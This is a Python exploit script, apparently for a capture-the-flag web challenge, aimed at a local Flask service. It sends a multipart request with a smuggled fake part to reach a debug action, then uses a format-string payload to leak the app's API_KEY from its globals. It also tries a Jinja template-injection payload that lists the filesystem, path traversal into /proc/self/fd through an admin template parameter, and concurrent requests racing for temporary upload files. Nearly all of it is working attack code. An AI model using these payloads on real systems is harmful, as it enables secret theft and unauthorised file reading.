import httpx
import threading
import time

TARGET = "http://127.0.0.1:5000"
BOUNDARY = "---------------------------FlagBoundary123"

def format_string_leak(payload):
    fake_action_part = (
        f'\r\n--{BOUNDARY}\r\n'
        f'Content-Disposition: form-data; name="action"; filename="action"\r\n'
        f'Content-Type: text/json\r\n\r\n'
        f'{{"type": "debug"}}\r\n'
    )
    
    text = payload + fake_action_part
    params = {
        'text': text,
        'client': 'Content-Type',
        'token': f'multipart/form-data; boundary={BOUNDARY}'
    }
    
    r = httpx.post(f"{TARGET}/heartbeat", data=params, timeout=10.0)
    return r.text.strip()

# 获取 API_KEY
api_key = format_string_leak("{0.view_functions[action].__globals__[API_KEY]}")
print(f"[+] API_KEY: {api_key}")

# 尝试一个巧妙的方法：
# 1. 发送一个包含 SSTI payload 的请求，使其被暂存在某处
# 2. 同时快速读取 /proc/self/fd/ 中的文件描述符

# 思路：Flask/Werkzeug 可能在处理大文件上传时使用临时文件
# 如果我们能在请求处理期间读取这个临时文件...

def slow_upload():
    """发送一个慢速请求，尝试让 payload 在临时文件中停留更长时间"""
    # 在 content 中放入 SSTI payload
    ssti_payload = "{{ lipsum.__globals__['os'].listdir('/') }}"
    
    # 创建一个大的 multipart 请求
    fake_action_part = (
        f'\r\n--{BOUNDARY}\r\n'
        f'Content-Disposition: form-data; name="action"; filename="action"\r\n'
        f'Content-Type: text/json\r\n\r\n'
        f'{{"type": "echo"}}\r\n'  # 使用 echo 类型，不触发 format string
    )
    
    text = ssti_payload + fake_action_part
    params = {
        'text': text,
        'client': 'Content-Type',
        'token': f'multipart/form-data; boundary={BOUNDARY}'
    }
    
    try:
        r = httpx.post(f"{TARGET}/heartbeat", data=params, timeout=5.0)
        print(f"[Slow upload] Response: {r.text}")
    except Exception as e:
        print(f"[Slow upload] Error: {e}")

# 检查 /proc/self/fd 中的文件
def check_fds():
    """检查所有可能的文件描述符"""
    for i in range(20):
        path = f'../../../proc/self/fd/{i}'
        try:
            headers = {"Authorization": api_key}
            r = httpx.get(f"{TARGET}/admin", params={"tmpl": path}, headers=headers, timeout=2.0)
            if r.status_code == 200 and len(r.text) > 0:
                print(f"[fd/{i}] Status: {r.status_code}, Content: {r.text[:100]}")
        except:
            pass

# 测试
print("\n[*] Checking file descriptors...")
check_fds()

# 尝试并发请求
print("\n[*] Testing concurrent requests...")
t1 = threading.Thread(target=slow_upload)
t1.start()
time.sleep(0.1)  # 稍微等待
check_fds()
t1.join()
